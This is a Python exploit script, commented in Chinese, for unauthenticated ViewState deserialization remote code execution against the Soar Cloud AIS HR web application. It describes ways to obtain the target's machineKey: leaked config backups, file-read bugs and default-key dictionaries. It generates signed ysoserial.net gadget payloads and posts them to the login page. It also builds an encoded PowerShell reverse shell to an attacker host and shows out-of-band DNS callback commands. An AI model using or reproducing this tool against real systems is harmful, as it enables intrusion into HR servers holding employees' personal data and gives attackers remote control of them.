#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
飛騰雲端 AIS 人資系統 (Soar Cloud AIS HR) — ASP.NET WebForms ViewState 反序列化 RCE
author-and-handoff exploit.  Operator runs this under supervision.

背景 / 前提 (precondition):
  AIS 的 Web 客户端 (/scsrwd/*.aspx, 含 Login.aspx) 是 ASP.NET WebForms + DevExpress。
  登录页【预认证】即带非空 __VIEWSTATE + 固定 __VIEWSTATEGENERATOR=E9414691 (跨租户一致,
  共享代码库 → 同一份 web.config/machineKey 极可能跨实例复用)。ViewState MAC 已启用,
  因此利用【需要 machineKey】(validationKey [+ decryptionKey])。一旦拿到密钥, 伪造的
  __VIEWSTATE 会被 LosFormatter 反序列化 → .NET gadget → RCE, 且【无需登录】。

  本工具只负责: 用 ysoserial.net 生成【已用目标 machineKey 签名/加密】的 ViewState 载荷,
  按真实的 WebForms 回发 (保留 antiforgery / session / 其余隐藏域) 投递, 并验证执行。
  .NET gadget 链与签名由 ysoserial.net 完成 (它正确处理 .NET 4.5+ 的 Purpose 串, 需要
  --path / --apppath / --generator)。本产品已升级至 .NET 4.7.2 → 走 4.5 方案。

如何拿到 machineKey (handoff 时由操作者完成, 几条现实途径):
  1. web.config / machineKey 泄露: 备份文件 (web.config.bak / .old / ~ )、源码泄露、
     LFI/任意文件读、错误页栈、或 "可透過 Tools 進行資料庫加密" 这类管理工具旁路。
  2. 共享/默认 machineKey: 若部署用了文档示例或固定密钥 → 跨所有租户通用 (本品 generator
     跨租户一致是强信号: 一份配置多实例)。比对已知默认 machineKey 字典。
  3. 已知 .NET 安全公告里的默认/泄露密钥集合 (blacklist3r / 公开 machineKey 库) 碰撞。
  无密钥则无法签名 → 工具会拒绝运行 (不空打)。

依赖:
  - ysoserial.net (https://github.com/pwntester/ysoserial.net) — 提供 ysoserial.exe 路径。
    Windows 直接用; Linux/Mac 用 mono。
  - Python 3.8+ (仅标准库)。

用法示例:
  # 1) 证明级 (proof): 让目标对你控制的主机发 DNS/HTTP, OOB 验证执行 (不落地、可逆)
  python viewstate_rce.py --url https://<target>/scsrwd/Login.aspx \
      --validationkey <HEX> --validationalg HMACSHA256 \
      --decryptionkey <HEX> --decryptionalg AES \
      --ysoserial ./ysoserial.exe \
      --cmd "nslookup proof-$RANDOM.<your-collab-domain>"

  # 2) 完整影响 (full impact, 操作者执行): 反弹 shell
  python viewstate_rce.py --url https://<target>/scsrwd/Login.aspx \
      --validationkey <HEX> --validationalg HMACSHA256 \
      --decryptionkey <HEX> --decryptionalg AES --ysoserial ./ysoserial.exe \
      --revshell <LHOST> <LPORT>

  # 3) 自带已生成载荷 (离线生成, 仅投递)
  python viewstate_rce.py --url https://<target>/scsrwd/Login.aspx --raw-viewstate-file vs.b64

注: --validationkey/--decryptionkey 必须是【目标的】密钥; 不在代码里硬编码任何真实密钥。
"""
import argparse
import base64
import http.cookiejar
import random
import re
import shlex
import ssl
import subprocess
import sys
import time
import urllib.parse
import urllib.request

EXPECTED_GENERATOR = "E9414691"  # 产品级常量 (识别签名), 非目标实例机密
HID = ["__EVENTTARGET", "__EVENTARGUMENT", "__VIEWSTATE", "__VIEWSTATEGENERATOR",
       "__EVENTVALIDATION", "__RequestVerificationToken", "__UNIQUEGUID",
       "__ROOTPATH", "__LOGINCOMPANYID", "__VALUECHANGEID",
       "__SCROLLPOSITIONX", "__SCROLLPOSITIONY"]


def build_opener(proxy=None, insecure=True):
    cj = http.cookiejar.CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(cj)]
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    if insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    op = urllib.request.build_opener(*handlers)
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def http_get(opener, url):
    with opener.open(url, timeout=30) as r:
        return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)


def http_post(opener, url, data, timeout=30):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    t0 = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace"), time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), time.time() - t0


def field(html, name):
    m = re.search(r'name="%s"[^>]*\bvalue="([^"]*)"' % re.escape(name), html)
    return m.group(1) if m else ""


def all_form_inputs(html):
    """Grab every <input name=.. value=..> so the postback mirrors the real form."""
    out = {}
    for m in re.finditer(r'<input[^>]*\bname="([^"]+)"[^>]*>', html):
        tag = m.group(0)
        name = m.group(1)
        v = re.search(r'\bvalue="([^"]*)"', tag)
        out[name] = v.group(1) if v else ""
    return out


def run_ysoserial(args, viewstate_path, apppath):
    cmd = [args.ysoserial, "-p", "ViewState", "-g", args.gadget,
           "--generator", args.generator,
           "--path", viewstate_path,
           "--apppath", apppath,
           "--validationkey", args.validationkey,
           "--validationalg", args.validationalg]
    if args.decryptionkey:
        cmd += ["--decryptionkey", args.decryptionkey,
                "--decryptionalg", args.decryptionalg]
    if args.islegacy:
        cmd += ["--islegacy"]
    if args.isencrypted:
        cmd += ["--isencrypted"]
    # command to execute on target
    cmd += ["-c", args.cmd]
    if not args.ysoserial.lower().endswith(".exe") and sys.platform != "win32":
        cmd = ["mono"] + cmd
    print("[*] ysoserial.net:\n    " + " ".join(shlex.quote(c) for c in cmd))
    p = subprocess.run(cmd, capture_output=True, text=True)
    if p.returncode != 0:
        sys.exit("[!] ysoserial.net failed:\n" + p.stderr)
    return p.stdout.strip()


def main():
    ap = argparse.ArgumentParser(description="Soar Cloud AIS ViewState RCE (author-and-handoff)")
    ap.add_argument("--url", required=True, help="target AIS aspx, e.g. https://<target>/scsrwd/Login.aspx")
    ap.add_argument("--validationkey", help="TARGET machineKey validationKey (hex)")
    ap.add_argument("--validationalg", default="HMACSHA256",
                    help="MD5/SHA1/HMACSHA256/HMACSHA384/HMACSHA512 (default HMACSHA256)")
    ap.add_argument("--decryptionkey", help="TARGET decryptionKey (hex), if ViewState encrypted")
    ap.add_argument("--decryptionalg", default="AES", help="DES/3DES/AES (default AES)")
    ap.add_argument("--isencrypted", action="store_true", help="ViewState is encrypted (set with decryptionkey)")
    ap.add_argument("--islegacy", action="store_true", help="target is .NET < 4.5 ViewState scheme")
    ap.add_argument("--generator", default=EXPECTED_GENERATOR, help="__VIEWSTATEGENERATOR (default product const)")
    ap.add_argument("--gadget", default="TextFormattingRunProperties",
                    help="ysoserial gadget (TextFormattingRunProperties / TypeConfuseDelegate / ActivitySurrogateSelector)")
    ap.add_argument("--ysoserial", default="ysoserial.exe", help="path to ysoserial.exe")
    ap.add_argument("--cmd", help="OS command to run on target")
    ap.add_argument("--revshell", nargs=2, metavar=("LHOST", "LPORT"),
                    help="convenience: build a PowerShell reverse shell as --cmd")
    ap.add_argument("--raw-viewstate-file", help="deliver a pre-generated base64 ViewState (skip ysoserial)")
    ap.add_argument("--proxy", help="http://host:port (Burp etc.)")
    args = ap.parse_args()

    if args.revshell and not args.cmd:
        lhost, lport = args.revshell
        ps = ("$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();"
              "[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
              "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);"
              "$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}" % (lhost, lport))
        b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
        args.cmd = "powershell -nop -w hidden -enc " + b64
        print("[*] reverse shell -> %s:%s (start your listener: nc -lvnp %s)" % (lhost, lport, lport))

    opener = build_opener(args.proxy)
    pu = urllib.parse.urlparse(args.url)
    viewstate_path = pu.path  # e.g. /scsrwd/Login.aspx

    print("[*] GET %s (fresh session + form state)" % args.url)
    st, html, _ = http_get(opener, args.url)
    if st != 200:
        print("[!] unexpected status %s (continuing)" % st)
    gen = field(html, "__VIEWSTATEGENERATOR") or args.generator
    if gen and args.generator == EXPECTED_GENERATOR and gen != EXPECTED_GENERATOR:
        print("[!] generator on page=%s differs from product const %s — using page value" % (gen, EXPECTED_GENERATOR))
        args.generator = gen
    apppath = field(html, "__ROOTPATH") or "/"
    print("[*] generator=%s  apppath=%s  path=%s" % (args.generator, apppath, viewstate_path))

    # build malicious ViewState
    if args.raw_viewstate_file:
        with open(args.raw_viewstate_file) as f:
            payload = f.read().strip()
        print("[*] using raw ViewState from %s (%d bytes)" % (args.raw_viewstate_file, len(payload)))
    else:
        if not (args.validationkey and args.cmd):
            sys.exit("[!] need --validationkey and (--cmd or --revshell), or --raw-viewstate-file. "
                     "No machineKey, no signing — refusing to send an unsigned blind payload.")
        payload = run_ysoserial(args, viewstate_path, apppath)
    if not payload:
        sys.exit("[!] empty ViewState payload")

    # mirror the real form, override __VIEWSTATE with the weaponized one
    form = all_form_inputs(html)
    for k in HID:
        form.setdefault(k, field(html, k))
    form["__VIEWSTATE"] = payload
    form.pop("__VIEWSTATEENCRYPTED", None)

    print("[*] POST weaponized __VIEWSTATE (%d b64 bytes) ..." % len(payload))
    st, body, dt = http_post(opener, args.url, form)
    print("[*] response: status=%s len=%s time=%.1fs" % (st, len(body), dt))

    # verification heuristics (RCE is usually blind on WebForms)
    if "錯誤訊息" in body or "Validation of viewstate MAC failed" in body or "state information is invalid" in body:
        print("[-] ViewState rejected (MAC/scheme mismatch). Check key/alg/path/apppath/--islegacy/--isencrypted.")
    else:
        print("[+] No MAC-rejection error page → payload accepted/deserialized.")
    print("    Confirm RCE out-of-band:")
    print("      - OOB: watch your collaborator (DNS/HTTP) for the --cmd callback")
    print("      - revshell: your listener should catch the connection")
    print("      - blind time test: --cmd 'powershell -c Start-Sleep 8' and compare response time")


if __name__ == "__main__":
    main()
